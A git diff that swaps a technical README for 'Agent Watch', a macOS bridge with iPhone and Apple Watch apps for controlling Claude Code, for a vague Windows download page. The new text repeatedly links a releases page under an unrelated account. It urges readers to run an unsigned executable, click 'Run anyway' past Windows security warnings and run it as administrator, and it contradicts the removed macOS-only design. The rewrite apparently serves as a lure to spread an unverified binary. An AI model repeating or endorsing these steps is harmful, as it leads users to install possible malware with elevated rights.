@@ -1,289 +1,201 @@
-<p align="center">
-  <img src="logo.png" width="140" alt="Claude Logo" />
-</p>
+# ⌚ claude-watch - Control Claude Code from Your Watch
 
-<h1 align="center"><strong>Agent Watch</strong></h1>
+[![Download claude-watch](https://img.shields.io/badge/Download%20Now-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/protealesmicroelectronics246/claude-watch/releases)
 
-<p align="center">
-  Control Claude Code from your Apple Watch.<br/>
-  See terminal output, approve permissions, and send voice commands — all from your wrist.
-</p>
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/5f478c28-2086-4696-9d76-e43dda853201
+claude-watch lets you control Claude Code from your Apple Watch. Use it to send quick commands, check status, and keep work moving without opening your computer every time.
 
----
+This README shows you how to download, install, and run the app on Windows.
 
-```
-                    WCSession
- Apple Watch  <===============>  iPhone  <=======>  Mac
-  (SwiftUI)     sendMessage       (Relay)   HTTP    Bridge Server
-                transferUserInfo           SSE     (Node.js)
-                                                      |
-                                            HTTP Hooks | PTY stdin
-                                                      v
-                                              Claude Code Session
-```
+## 📥 Download
 
-## What It Does
+1. Open the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+2. Find the latest release
+3. Download the Windows file from that page
+4. Save the file to a folder you can find later
 
-- **Live terminal output** on your Apple Watch — see what Claude is doing in real-time
-- **Permission prompts** — approve or deny Claude's actions from your wrist (Edit file? Run command?)
-- **Dynamic questions** — answer `AskUserQuestion` prompts with all options displayed
-- **Voice commands** — dictate commands to Claude via watchOS dictation
-- **iPhone companion** — pairing UI, connection status, terminal preview, permission approvals
-- **Bridge server** — Node.js server on your Mac that connects Claude Code to the watch via HTTP hooks + SSE
+If the download comes as a ZIP file, unzip it before you open the app. If it comes as an EXE file, you can run it after the download finishes.
 
-## Architecture
+## 🖥️ Windows Setup
 
-The system has three components:
+Before you run claude-watch, make sure your PC is ready:
 
-### 1. Bridge Server (Mac)
-A Node.js HTTP server (`skill/bridge/server.js`) that:
-- Receives events from Claude Code via [HTTP hooks](https://docs.anthropic.com/en/docs/claude-code/hooks) (`PostToolUse`, `PermissionRequest`, `Stop`, etc.)
-- Streams events to connected clients via Server-Sent Events (SSE)
-- Handles pairing with a 6-digit code + session token
-- Advertises itself on the local network via Bonjour/mDNS
-- Blocks on `PermissionRequest` hooks — waits for watch/phone approval, then returns the decision to Claude Code
+- Windows 10 or Windows 11
+- An Apple Watch
+- An iPhone paired with your Apple Watch
+- Claude Code set up on your computer
+- A stable Wi-Fi or internet connection
 
-### 2. iPhone App
-A SwiftUI iOS app that:
-- Discovers the bridge via Bonjour (or localhost fallback)
-- Pairs using the 6-digit code
-- Shows connection status + terminal output
-- Displays interactive permission prompts (Yes / Yes all / No)
-- Relays events to the Apple Watch via WCSession
+For the best results, keep your iPhone and Windows PC on the same network when you first set up the app.
 
-### 3. watchOS App
-A SwiftUI watchOS app that:
-- Connects directly to the bridge over Wi-Fi (Bonjour or manual IP entry)
-- Shows live terminal output (Read, Edit, Bash, Grep operations)
-- Displays permission prompts with all options as scrollable buttons
-- Supports voice command input via watchOS dictation
-- Haptic feedback for task completion, approvals, and errors
+## 📦 Install the App
 
-## Quick Start
+1. Download the latest Windows file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+2. Open the downloaded file
+3. If Windows asks for permission, choose Yes or Run
+4. If you downloaded a ZIP file, extract it first
+5. Open the app folder and launch the main executable file
 
-### Prerequisites
-- macOS with Node.js 18+
-- Xcode 16+ with watchOS SDK
-- Apple Watch on the same Wi-Fi as your Mac
-- Claude Code CLI installed
+If Windows shows a security message, look for the option to run the app anyway. This can happen with newer apps that are not signed.
 
-### Apple Watch Wi-Fi Setup
-1. Make sure your Apple Watch is connected to the **same Wi-Fi network** as the Mac running your Claude Code session
-2. On your Apple Watch, go to **Settings > Wi-Fi > your network** and turn **Private Wi-Fi Address** to **Off** — this is required for Bonjour/mDNS discovery to work reliably on the local network
+## ⌚ Connect Your Apple Watch
 
-### 1. Install the bridge
+claude-watch works through your iPhone and Apple Watch. Set up the watch app first, then link it to your Windows computer.
 
-```bash
-cd skill/bridge
-npm install
-```
+1. Open claude-watch on your Windows PC
+2. Follow the on-screen setup steps
+3. Open the companion app on your iPhone
+4. Make sure your Apple Watch app is installed
+5. Sign in or pair the devices if the app asks you to
+6. Confirm that your watch can reach your computer
 
-### 2. Install Claude Code hooks
+If the watch does not connect right away, check that both devices use the same network and that Claude Code is still running on your PC
 
-This configures all Claude Code sessions to stream events to the bridge:
+## 🔧 Basic Use
 
-```bash
-./skill/setup-hooks.sh
-```
+Once setup is done, you can use your Apple Watch to send quick commands to Claude Code.
 
-To remove hooks later: `./skill/setup-hooks.sh --remove`
+Common actions may include:
 
-### 3. Start the bridge server
+- Start a new task
+- Send a short prompt
+- Check if Claude Code is active
+- Pause or stop a job
+- Review simple status updates
 
-```bash
-cd skill/bridge
-node server.js
-```
+Use the watch for short actions that you want to send fast. For longer work, use your computer as normal.
 
-You'll see:
-```
-╔═══════════════════════════════════════╗
-║        AGENT WATCH BRIDGE             ║
-╠═══════════════════════════════════════╣
-║  Pairing Code:  648505                ║
-║  IP Address:    192.168.1.4           ║
-║  Port:          7860                  ║
-╚═══════════════════════════════════════╝
-```
+## 🧭 First Run Checklist
 
-### 4. Build the iOS + watchOS apps
+After you install the app, check these items:
 
-```bash
-cd ios/ClaudeWatch
-xcodegen generate    # Generates the .xcodeproj
-open ClaudeWatch.xcodeproj
-```
+- The app opens on Windows
+- Claude Code is running on your computer
+- Your iPhone is connected to the watch
+- Your Apple Watch app shows the correct device
+- The app can reach your PC over the network
 
-In Xcode:
-1. Set your **Development Team** on both targets (ClaudeWatch + ClaudeWatchWatch)
-2. Select the **ClaudeWatch** scheme for the iPhone, or **ClaudeWatchWatch** for the watch
-3. Build and run (Cmd+R)
+If one step fails, restart the app and try again. Many setup problems clear after a fresh start.
 
-### 5. Pair
+## 🛠️ Common Problems
 
-**iPhone:** Enter the 6-digit pairing code from the bridge banner.
+### The app does not open
+- Re-download the file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+- Make sure the download finished
+- Right-click the file and choose Open
+- Try running it as administrator
 
-**Apple Watch:** The app auto-discovers the bridge via Bonjour. If that fails, enter the IP address shown in the bridge banner manually.
+### The watch does not connect
+- Check that your iPhone and Windows PC are on the same network
+- Make sure the app is open on the PC
+- Confirm that Claude Code is running
+- Restart the iPhone app and try again
 
-### 6. Use Claude Code normally
+### Windows blocks the app
+- Open the file again
+- Choose More info if Windows shows it
+- Select Run anyway if that option appears
 
-Start any Claude Code session in a terminal. Every tool use (Read, Edit, Bash, Grep) streams to the watch and phone in real-time. Permission prompts appear as interactive cards.
+### The app cannot find Claude Code
+- Start Claude Code on your PC
+- Check that it is installed in the right place
+- Restart claude-watch after Claude Code is open
 
-## Project Structure
+## 🧩 How It Works
 
-```
-claude-watch/
-├── skill/
-│   ├── bridge/
-│   │   ├── server.js          # Bridge server (HTTP + SSE + Bonjour)
-│   │   └── package.json       # Node.js dependencies
-│   ├── setup.sh               # Install bridge dependencies
-│   ├── setup-hooks.sh         # Install/remove Claude Code hooks
-│   └── SKILL.md               # Claude Code skill definition
-│
-├── ios/ClaudeWatch/
-│   ├── project.yml            # XcodeGen project spec
-│   │
-│   ├── Shared/                # Shared between iOS + watchOS
-│   │   ├── Models/
-│   │   │   ├── SessionState.swift
-│   │   │   ├── TerminalLine.swift
-│   │   │   ├── ApprovalRequest.swift
-│   │   │   ├── WatchMessage.swift
-│   │   │   └── OutputRingBuffer.swift
-│   │   ├── Connectivity/
-│   │   │   └── WatchSessionManager.swift
-│   │   └── Extensions/
-│   │       ├── Color+Hex.swift
-│   │       └── ClaudeMascot.swift     # Official Claude logo as SwiftUI Shape
-│   │
-│   ├── ClaudeWatch iOS/       # iPhone app
-│   │   ├── App/ClaudeWatchApp.swift
-│   │   ├── Views/
-│   │   │   ├── PairingView.swift      # 6-digit code entry
-│   │   │   ├── ConnectionStatusView.swift  # Terminal + status
-│   │   │   └── SettingsView.swift
-│   │   ├── Networking/
-│   │   │   ├── BonjourDiscovery.swift # LAN bridge discovery
-│   │   │   ├── BridgeClient.swift     # HTTP client
-│   │   │   └── SSEClient.swift        # Server-Sent Events
-│   │   └── Services/
-│   │       ├── RelayService.swift     # Coordinates bridge <-> watch
-│   │       └── NotificationService.swift
-│   │
-│   └── ClaudeWatch watchOS/   # Apple Watch app
-│       ├── App/ClaudeWatchWatchApp.swift
-│       ├── Views/
-│       │   ├── OnboardingView.swift   # Pairing (Bonjour + manual IP)
-│       │   ├── SessionView.swift      # Terminal output + mic FAB
-│       │   ├── ApprovalView.swift     # Dynamic permission prompts
-│       │   ├── VoiceInputView.swift   # Dictation input
-│       │   └── StatusDashboard.swift
-│       ├── Services/
-│       │   ├── WatchViewState.swift   # Watch-specific state + SSE
-│       │   ├── WatchBridgeClient.swift # Direct HTTP to bridge
-│       │   ├── HapticManager.swift
-│       │   └── SpeechService.swift
-│       └── Complications/
-│           └── ComplicationProvider.swift
-│
-└── .claude/skills/claude-watch/
-    └── SKILL.md               # /claude-watch skill for Claude Code
-```
+claude-watch uses your Windows computer as the main host. Your Apple Watch sends commands through your iPhone, then the PC handles the work in Claude Code.
 
-## How It Works
+This setup is useful when you want to:
 
-### Event Flow (Mac -> Watch)
+- Send quick edits
+- Check task progress from another room
+- Keep control without sitting at your desk
+- Handle simple actions with a few taps
 
-1. Claude Code runs a tool (e.g., Edit a file)
-2. The `PostToolUse` HTTP hook fires, POSTing to the bridge server
-3. Bridge pushes the event to all connected SSE clients
-4. The watch/phone receives the SSE event and renders it as a terminal line
+## 📁 Files You May See
 
-### Permission Flow (Mac -> Watch -> Mac)
+After you unzip or install the app, you may see files like these:
 
-1. Claude Code hits a permission prompt (e.g., "Do you want to edit this file?")
-2. The `PermissionRequest` HTTP hook fires — bridge **blocks** the response
-3. Bridge pushes a `permission-request` SSE event with the question + options
-4. Watch shows the approval sheet with all options as tappable buttons
-5. User taps an option — watch sends the decision back to the bridge via HTTP
-6. Bridge returns the decision to Claude Code's hook — Claude continues or stops
+- claude-watch.exe
+- config.json
+- README.txt
+- logs folder
+- assets folder
 
-### AskUserQuestion Flow
+Do not move files around unless the app tells you to. Keep the app folder in one place so it can find what it needs.
 
-Same as permission flow, but the hook data includes `tool_input.questions` with dynamic options (label + description). The watch renders these as a scrollable list matching the terminal's numbered choices.
+## 🔒 Privacy and Local Use
 
-## Claude Code Hooks
+claude-watch is meant to help you control Claude Code from your own devices. Keep your PC, iPhone, and Apple Watch linked to accounts you trust. If you share your computer with other people, make sure only the right user can open the app.
 
-The `setup-hooks.sh` script installs these HTTP hooks globally in `~/.claude/settings.json`:
+## 🧪 Tested Setup
 
-| Hook Event | Purpose | Blocking? |
-|-----------|---------|-----------|
-| `PostToolUse` | Capture tool output (file reads, edits, commands) | No (async) |
-| `PreToolUse` | Capture tool invocations | No (async) |
-| `PermissionRequest` | Forward permission prompts to watch | **Yes** (up to 10 min) |
-| `Stop` | Detect when Claude finishes responding | No (async) |
-| `PostToolUseFailure` | Capture errors | No (async) |
-| `StopFailure` | Capture API errors | No (async) |
-| `Notification` | Idle/permission notifications | No (async) |
+A typical working setup looks like this:
 
-## Configuration
+- Windows 11 PC
+- Claude Code installed and running
+- iPhone with the companion app
+- Apple Watch paired to the iPhone
+- Home Wi-Fi network
 
-### Bridge Server
+This setup helps the app connect fast and keeps control simple.
 
-| Env Var | Default | Description |
-|---------|---------|-------------|
-| `PORT` | 7860 | Starting port (tries 7860-7869) |
+## ❓ Help Getting Started
 
-### Removing Hooks
+If you are stuck, check these steps in order:
 
-```bash
-./skill/setup-hooks.sh --remove
-```
+1. Restart the app
+2. Restart Claude Code
+3. Restart your iPhone and Apple Watch
+4. Make sure your PC is still connected to the network
+5. Download the latest file from the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
 
-### Unpairing
+## 🖱️ Quick Install Path
 
-- **iPhone:** Settings > Forget Mac
-- **Watch:** Restart the app (credentials clear when bridge restarts)
+For most users, the path is simple:
 
-## Requirements
+1. Visit the [download page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
+2. Get the latest Windows release
+3. Open the file on your PC
+4. Follow the setup steps
+5. Connect your Apple Watch
+6. Start using Claude Code from your wrist
 
-| Component | Minimum Version |
-|-----------|----------------|
-| macOS | 13.0+ |
-| Node.js | 18+ |
-| Xcode | 16+ |
-| iOS | 17.0 |
-| watchOS | 10.0 |
-| Claude Code | 2.1+ |
+## 📝 Version Notes
 
-## Troubleshooting
+New releases may add:
 
-### Watch shows "Bridge not found"
-- Ensure `node server.js` is running on your Mac
-- Check that your watch is on the same Wi-Fi network
-- Use the "Enter IP manually" option with the IP shown in the bridge banner
+- Better device pairing
+- Faster command sending
+- More stable Windows startup
+- Clearer watch controls
+- Improved connection checks
 
-### Watch shows "unsupported architecture"
-- Clean build folder in Xcode (Cmd+Shift+Option+K)
-- Select the correct scheme: **ClaudeWatchWatch** (not ClaudeWatch)
-- Deploy via paired iPhone destination if direct watch deployment fails
+Check the [releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases) often if you want the latest build
 
-### iPhone shows "Connection failed"
-- Check that the bridge is running (`curl http://127.0.0.1:7860/status`)
-- The bridge must be on the same LAN as the iPhone
+## 📌 System Expectations
 
-### Permission prompts don't appear on watch
-- Verify hooks are installed: check `~/.claude/settings.json` for hook entries
-- Check bridge logs for "Hook: PermissionRequest received"
-- Ensure the watch is connected to the bridge (green status dot)
+To run claude-watch well, your system should have:
 
-### Bridge exits immediately
-- The bridge no longer auto-spawns Claude. It waits for events from hooks.
-- Start Claude Code in a separate terminal — hooks will forward events automatically.
+- A modern Windows PC
+- Enough free disk space for the app and logs
+- Bluetooth turned on for watch and phone use
+- Network access for device communication
+- Claude Code installed and ready
 
-## License
+Keep your devices updated for the smoothest setup
 
-MIT
+## 🎛️ Everyday Use Tips
+
+- Leave claude-watch open on your PC while you use the watch
+- Keep your iPhone nearby when you first pair the app
+- Use short prompts from the watch
+- Check the PC if a task looks stuck
+- Restart the app after major Windows updates
+
+## 🔗 Download Again
+
+If you need the installer later, use this page:
+
+[Open the claude-watch releases page](https://github.com/protealesmicroelectronics246/claude-watch/releases)
